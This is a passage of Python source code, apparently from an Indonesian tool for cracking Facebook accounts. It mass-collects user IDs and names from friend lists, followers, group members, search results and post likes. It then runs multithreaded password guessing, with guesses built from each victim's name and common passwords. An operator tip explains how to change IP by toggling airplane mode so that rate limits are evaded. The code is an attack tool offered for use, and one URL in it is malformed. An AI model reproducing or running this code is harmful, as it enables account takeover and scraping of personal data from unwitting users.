		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()
		
def dump_follower():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	win = '# PASTIKAN ID TARGET PUBLIK'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
	pil = input(x+'['+p+'f'+x+'] Masukkan ID Target : ')
	try:
		jumlah = int(input(x+'['+p+'f'+x+'] Masukan Limit : '))
		if jumlah>5000:
			jalan(x+'['+p+'f'+x+'] Maksimal 5000 ID')
			time.sleep(0.5)
			dump_follower()
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		kras = '# INFO TARGET'
		kras2 = mark(kras, style='green')
		sol().print(kras2)
		print(x+'['+h+'•'+x+'] Nama  : '+str(grex))
	except (KeyError,IOError):
		teks = '# ID Tidak Ditemukan'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		time.sleep(2)
		exit()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	try:
		koh2 = requests.get("https://graph.facebook.com/"+pil+"/subscribers?limit="+str(jumlah)+"&access_token="+token)
		koh3 = json.loads(koh2.text)
		for pi in koh3['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()
		
def oldpublik():
        try:
                token = open("token.txt","r").read()
        except IOError:
                jalan(balmond+m+" Token Kadaluarsa")
                time.sleep(0.5)
                login()
        old_gak.append("old")
        try:
                nada = int(input("\n"+balmond+l+" Mau Crack Berapa ID : "))
                if nada>10:
                        jalan(balmond+m+" Maksimal 10 ID")
                        time.sleep(0.5)
                        oldfollow()
        except ValueError:
                jalan(balmond+m+" Input Invalid")
                time.sleep(0.5)
                oldfollow()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(balmond+l+" Masukkan ID Target Ke %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(balmond+l+" Nama : "+tulul["name"])
                except KeyError:
                        print(balmond+m+" ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get(f'https://graph.facebook.com/{uid}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
                        for cew in bulu['friends']['data']:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                elif len(jamet)==15 and jamet[4]=="0":
                                                        if jamet[5]=="0":
                                                                if jamet[6]=="0" or jamet[6]=="1" or jamet[6]=="2" or jamet[6]=="3" or jamet[6]=="4" or jamet[6]=="5" or jamet[6]=="6" or jamet[6]=="7" or jamet[6]=="8":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        print(balmond+l+" Total ID : "+h+"%s"%(len(non_old)))
                        print(balmond+l+" Total ID Old : "+h+"%s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        print(balmond+l+" Jumlah Total ID Old : "+h+"%s"%(len(id)))
        setting()
def oldfollow():
        try:
                token = open("token.txt","r").read()
        except IOError:
                jalan(balmond+m+" Token Kadaluarsa")
                time.sleep(0.5)
                login()
        old_gak.append("old")
        try:
                nada = int(input("\n"+balmond+l+" Mau Crack Berapa ID : "))
                if nada>10:
                        jalan(balmond+m+" Maksimal 10 ID")
                        time.sleep(0.5)
                        oldfollow()
        except ValueError:
                jalan(balmond+m+" Input Invalid")
                time.sleep(0.5)
                oldfollow()
        for dot in range(nada):
                dot+=1
                tampung = []
                non_old = []
                uid = input(balmond+l+" Masukkan ID Target Ke %s : "%(dot))
                try:
                        asu = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token)
                        tulul = json.loads(asu.text)
                        print(balmond+l+" Nama : "+tulul["name"])
                except KeyError:
                        print(balmond+m+" ID Salah")
                        time.sleep(0.5)
                        exit()
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
                try:
                        bulu = requests.get("https://graph.facebook.com/"+uid+"/subscribers?limit=1000000&access_token="+token)
                        buriq = json.loads(bulu.text)
                        for cew in buriq["data"]:
                                try:
                                        jamet = cew["id"]
                                        junet = cew["name"]
                                        non_old.append(jamet+"|"+junet)
                                        detec = jamet+"|"+junet
                                        if detec in id:
                                                continue
                                        else:
                                                if len(jamet)==6 or len(jamet)==7 or len(jamet)==8:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==9:
                                                        id.append(jamet+"|"+junet)
                                                        tampung.append(jamet+"|"+junet)
                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                elif len(jamet)==10 and jamet[0]=="1":
                                                        if jamet[1]=="0" or jamet[1]=="1":
                                                                if jamet[2]=="0" or jamet[2]=="1" or jamet[2]=="2":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                elif len(jamet)==15 and jamet[4]=="0":
                                                        if jamet[5]=="0":
                                                                if jamet[6]=="0" or jamet[6]=="1" or jamet[6]=="2" or jamet[6]=="3" or jamet[6]=="4" or jamet[6]=="5" or jamet[6]=="6" or jamet[6]=="7" or jamet[6]=="8":
                                                                        id.append(jamet+"|"+junet)
                                                                        tampung.append(jamet+"|"+junet)
                                                                        well = open("id.txt","a");well.write(jamet+"\n");well.close()
                                                                else:continue
                                                        else:continue
                                                else:
                                                        continue
                                except:
                                        continue
                        print(balmond+l+" Total ID : "+h+"%s"%(len(non_old)))
                        print(balmond+l+" Total ID Old : "+h+"%s\n"%(len(tampung)))
                except requests.exceptions.ConnectionError:
                        jalan(balmond+m+" Tidak Ada Internet")
                        time.sleep(0.5)
                        exit()
        print(balmond+l+" Jumlah Total ID Old : "+h+"%s"%(len(id)))
        setting()

# DUMP ID MASSAL
def dump_massal():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	win = '# PASTIKAN ID TARGET PUBLIK'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH ID (LIMIT 10)')
	try:
		jum = int(input(x+'['+p+'f'+x+'] BERAPA ID : '))
	except ValueError:
		pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	if jum<1 or jum>10:
		pesan = '# OUT OF RANGE MEN'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	uid = []
	yz = 0
	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			po = requests.get(f'https://graph.facebook.com/{kl}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
			for i in po['friends']['data']:
				id.append(f"{i['id']}|{i['name']}")
				print(f"\r[!] {N}Mengumpulkan Id {M}> {H}[{J}{len(id)}{H}] ",end="")
			print("")
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	tot = '# BERHASIL MENGUMPULKAN %s ID'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='red')
	else:
		tot2 = mark(tot, style='green')
	sol().print(tot2)
	setting()
	
def dump_follower_massal():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	win = '# PASTIKAN ID TARGET PUBLIK'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH ID (LIMIT 10)')
	try:
		jum = int(input(x+'['+p+'f'+x+'] BERAPA ID : '))
	except ValueError:
		pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	if jum<1 or jum>10:
		pesan = '# OUT OF RANGE MEN'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	uid = []
	yz = 0
	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			po = requests.get(f'https://graph.facebook.com/{kl}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
			for i in po['friends']['data']:
				id.append(f"{i['id']}|{i['name']}")
				print(f"\r[!] {N}Mengumpulkan Id {M}> {H}[{J}{len(id)}{H}] ",end="")
			print("")
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	tot = '# BERHASIL MENGUMPULKAN %s ID'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='red')
	else:
		tot2 = mark(tot, style='green')
	sol().print(tot2)
	setting()
	
balmond = O+"["+J+"•"+O+"]"
	
def grup():
	win = '# PASTIKAN ID GROUP PUBLIK'
	win2 = mark(win, style='green')
	sol().print(win2)
	id = input(""+balmond+l+" Id Atau User Name Grup : ")
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	url = "https://mbasic.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, "html.parser")
	except requests.exceptions.ConnectionError:
		jalan(balmond+l+" Koneksi Internet Terputus..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		jalan(balmond+l+" Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		exit()
	elif berr2=='Kesalahan':
		jalan(balmond+l+" Grup Tidak Ditemukan..")
		time.sleep(0.5)
		exit()
	else:pass
	print(""+balmond+l+" Nama Grup : "+berr2)
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print(balmond+l+" Anggota : -")
	else:
		print(balmond+l+" Anggota : "+str(ang[0]))
	grup1(url)

def grup1(urls):
	use = []
	ses = requests.Session()
	print(""+balmond+l+" Jika Stack, Mode Pesawat 5 Detik")
	print(balmond+l+" Sedang Mengumpulkan ID")
	print(balmond+l+" Tekan CTRL + C Untuk Stop")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+O+"Mengumpulkan ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://mbasic.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()
			
def nama():
	nama = input("\n"+balmond+l+" User Nama : ")
	print(balmond+l+" Tekan CTRL + C Untuk Stop\n")
	link = []
	na = []
	cuy = random.choice(['0','10','20','30','40','50','60'])
	cuy2 = random.choice(['0','1','2','3','4','5'])
	cuy3 = random.choice(['0','50','100','150','200'])
	cuy4 = random.choice(['0','10','20','30','40','50','100','150','200','250','300','350','400'])
	ses = requests.Session()
	while True:
		try:
			li = nama.replace(' ','+')
			try:
				lord = link[0]
			except IndexError:
				lord = 'https://mbasic.facebook.com/public/'+li
			r = parser(ses.get(lord).text,'html.parser')
			ll = r.find_all('a')
			for c in ll:
				if c.text=='Lihat Hasil Selanjutnya':
					lol = str(c).replace('<a href="','').replace('amp;','')
					link_ = lol.split(' ')[0].replace('"><img','')
				for de in str(c).split('"'):
					xf = de.split(',')
					if ' profile picture' in xf:
						name_ = xf[0]
						lit = str(c).split('"')[1].replace('/','').replace('profile.php?id=','')
						na.insert(0,name_)
						if lit+'|'+name_ in id:
							continue
						else:
							id.append(lit+'|'+name_)
							print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
			try:
				link7 = link_
			except:
				link7 = 'taik'
			if link7=='taik':
				if len(id)==0:
					jalan(balmond+l+" Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
					time.sleep(0.5)
					exit()
				else:pass
				try:
					bill = na[400]
					link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy4)].replace(' ','+'))
				except:
					try:
						bill = na[220]
						link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy3)].replace(' ','+'))
					except:
						try:
							bill = na[55]
							link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy)].replace(' ','+'))
						except:
							try:
								link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy2)].replace(' ','+'))
							except:
								lah()
			else:
				try:
					both = link[0]
					if link7==both:
						try:
							bill = na[400]
							link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy4)].replace(' ','+'))
						except:
							try:
								bill = na[220]
								link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy3)].replace(' ','+'))
							except:
								try:
									bill = na[55]
									link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy)].replace(' ','+'))
								except:
									try:
										link.insert(0,'https://mbasic.facebook.com/public/'+na[int(cuy2)].replace(' ','+'))
									except:
										lah()
					else:
						link.insert(0,link7)
				except:
					link.insert(0,link7)
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()
			
def like():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	win = '# PASTIKAN ID POSTINGAN PUBLIK'
	win2 = mark(win, style='green')
	sol().print(win2)
	pil = input(x+'['+p+'f'+x+'] Masukkan ID Postingan : ')
	try:
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		kras = '# INFO TARGET'
		kras2 = mark(kras, style='green')
		sol().print(kras2)
		print(x+'['+h+'•'+x+'] Nama  : '+str(grex))
	except (KeyError,IOError):
		teks = '# ID Tidak Ditemukan'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		time.sleep(2)
		exit()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	try:
		po = requests.get(f'https://graph.facebook.com/{pil}?fields=name,likes.fields(id,name).limit(5000)&access_token={token}').json()
		for i in po['likes']['data']:
			id.append(f"{i['id']}|{i['name']}")
			print(f"\r[!] {N}Mengumpulkan Id {M}> {H}[{J}{len(id)}{H}] ",end="")
		print("")
		print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()
		
def likes():
	try:
		toket = open('token.txt', 'r').read()
	except IOError:
		os.system('rm -rf token.txt')
		time.sleep(0.01)
		os.sys.exit()
	win = '# PASTIKAN ID POSTINGAN PUBLIK'
	win2 = mark(win, style='green')
	sol().print(win2)
	idt = input(x+'['+p+'f'+x+'] Masukkan ID Postingan : ')
	try:
		jumlah = int(input(x+'['+p+'f'+x+'] Masukan Limit : '))
		if jumlah>20000:
			jalan(x+'['+p+'f'+x+'] Maksimal 20000 ID')
			time.sleep(0.5)
			likes()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit="+str(jumlah)+"&access_token="+toket)
		z = json.loads(r.text)
		for a in z['data']:
			idne = a['id']
			jenenge = a["name"]
			id.append(idne+'|'+jenenge)
	except KeyError:
		teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()
	print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
	setting ()
	
def share():
	try:
		toket = open('token.txt', 'r').read()
	except IOError:
		os.system('rm -rf token.txt')
		time.sleep(0.01)
		os.sys.exit()
	win = '# PASTIKAN ID POSTINGAN PUBLIK'
	win2 = mark(win, style='green')
	sol().print(win2)
	idt = input(x+'['+p+'f'+x+'] Masukkan ID Postingan : ')
	try:
		r=requests.get("https://graph.facebooklcom/me/feed?link={idt}&published=0&access_token={token}")
		z = json.loads(r.text)
		for a in z['data']:
			idne = a['id']
			jenenge = a["name"]
			id.append(idne+'|'+jenenge)
	except KeyError:
		teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()
	print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
	setting ()
def dump_massal():
	try:
		token = open('token.txt','r').read()
	except IOError:
		exit()
	win = '# PASTIKAN ID TARGET PUBLIK'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] MASUKKAN JUMLAH ID (LIMIT 10)')
	try:
		jum = int(input(x+'['+p+'f'+x+'] BERAPA ID : '))
	except ValueError:
		pesan = '# INPUT YANG ANDA MASUKKAN BUKAN ANGKA'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	if jum<1 or jum>10:
		pesan = '# OUT OF RANGE MEN'
		pesan2 = mark(pesan, style='red')
		sol().print(pesan2)
		exit()
	uid = []
	yz = 0
	print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Masukkan ID Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			po = requests.get(f'https://graph.facebook.com/{kl}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
			for i in po['friends']['data']:
				id.append(f"{i['id']}|{i['name']}")
				print(f"\r[!] {N}Mengumpulkan Id {M}> {H}[{J}{len(id)}{H}] ",end="")
			print("")
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	tot = '# BERHASIL MENGUMPULKAN %s ID'%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='red')
	else:
		tot2 = mark(tot, style='green')
	sol().print(tot2)
	setting()
	

def lah():
	print("\r"+balmond+l+" Total ID : "+str(len(id))+"                     ")
	input(balmond+l+" Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack ")
	pass
	setting()
def love():
	guw = '# SILAHKAN PILIH LIST PASSWORD?'
	sol().print(mark(guw, style='green'))
	tap = me()
	tap.add_column('NO', style='red', justify='center')
	tap.add_column('LIST PASSWORD', style='yellow', justify='center')
	tap.add_row('[S]',' Slow, List Pw Banyak, Boros Kuota')
	tap.add_row('[C]',' Cepat, List Pw Lebih Sedikit, Hemat Kuota')
	sol().print(tap, justify='center')
	mode2 = input("[?] Pilih List Password : ")
	if "s" in mode2 or "S" in mode2:
		pass_tipe.append("S")
	else:
		pass_tipe.append("C")
# PENGATURAN ID
	
def setting():
	wl = '# SETTING URUTAN ID'
	sol().print(mark(wl, style='green'))
	tap = me()
	tap.add_column('NO', style='red', justify='center')
	tap.add_column('PILIHAN CRACK', style='yellow', justify='center')
	tap.add_row('[01]',' Crack Dari Akun Tertua (Not Recommended)')
	tap.add_row('[02]',' Crack Dari Akun Termuda (Recommended)')
	tap.add_row('[03]',' Acak Urutan ID (Highly Recommended)')
	sol().print(tap, justify='center')
	hu = input(x+'['+p+'f'+x+'] Pilih : ')
	if hu in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif hu in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		ric = '# PILIHAN TIDAK ADA DI MENU'
		sol().print(mark(ric, style='red'))
		exit()
	guw = '# INGIN OPSI CRACK?'
	sol().print(mark(guw, style='green'))
	osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? (Y/t) : ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
	guw = '# SILAHKAN PILIH LIST PASSWORD?'
	sol().print(mark(guw, style='green'))
	osk = input(x+'['+p+'f'+x+'] Ingin Menggunakan Password Default/Manual/Gabungan? (d/m/g) : ')
	if osk in [""]:
		ric = '# PILIHAN TIDAK ADA DI MENU'
		sol().print(mark(ric, style='red'))
		exit()
	elif osk in["d","D"]:
		love()
		__otomatis__()
	elif osk in["m","M"]:
		__Manual__()
	elif osk in["g","G"]:
		__Gabung__()
def __otomatis__():
	met = '# PILIH METHOD CRACK'
	sol().print(mark(met, style='green'))
	tap = me()
	tap.add_column('NO', style='red', justify='center')
	tap.add_column('METHODE', style='yellow', justify='center')
	tap.add_row('[01]',' Method Api [NOT RECOMMENDED]')
	tap.add_row('[02]',' Method Mbasic [RECOMMENDED V1]')
	tap.add_row('[03]',' Method Mobile [RECOMMENDED V2]')
	tap.add_row('[04]',' Method Mobile [RECOMMENDED V3]')
	tap.add_row('[05]',' Method Mobile [RECOMMENDED V4]')
	tap.add_row('[06]',' Method Mobile [RECOMMENDED V5]')
	sol().print(tap, justify='center')
	hc = input(x+'['+p+'f'+x+'] Pilih : ')
	if hc in ['1','01']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				nam = nmf.split(' ')
				if "S" in pass_tipe:
					if len(nam) == 2 or len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345"]
					elif len(nam) == 6:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345"]
					else:
						pwv = ['sayang','akusayangkamu','bagong','katasandi','123456','loveyou','bagong','bismillah','anjing','katasandi','password','facebook','bajingan']
				elif "C" in pass_tipe:
					if len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
					else:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
				pool.submit(api,idf,pwv)
	elif hc in ['2','02']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
		krek = f'jika kamu menggunakan Wifi mungkin akan mudah kena spam dan akan\nberakibat ke hasil. hasil akan lebih sedikit bahkan tidak akan ada hasil sama sekali. Hal ini dikarenakan IP Wifi tidak bisa berubah\nBeda jika pake data seluler kamu tinggal nyalakan mode pesawat dan\nIP bakal berubah otomatis akan mengurangi terjadinya Spam IP, maka dari itu\nSetiap 200/500 akun diproses Nyalakan Mode Pesawat 5 Detik untuk menghindari Spam IP.\nBiasanya 90% akun cekpoint jika akun yang didapat sudah mati alias tidak aktif\njika proses stuk atau macet nyalakan mode pesawat beberapa detik'
		cetak(nel(krek, title='• Tips •'))
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split("|")
				nam = nmf.split(' ')
				if "S" in pass_tipe:
					if len(nam) == 2 or len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345"]
					elif len(nam) == 6:
						pwv = [nmf, nam[0], nam[0]+"123", nam[0]+"1234", nam[0]+"12345"]
					else:
						pwv = ['sayang','akusayangkamu','bagong','katasandi','123456','loveyou','bagong','bismillah','anjing','katasandi','password','facebook','bajingan']
				elif "C" in pass_tipe:
					if len(nam) == 3 or len(nam) == 4 or len(nam) == 5:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
					else:
						pwv = [nmf, nam[0]+"123",nam[0]+"12345"]
				pool.submit(crack2,idf,pwv)
	elif hc in ['3','03']:
		ler = '# PROSES CRACK DIMULAI, TEKAN CTRL+Z UNTUK BERHENTI'
		sol().print(mark(ler, style='green'))
		krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s'%(okc,cpc)
		cetak(nel(krek, title='• Hasil •'))
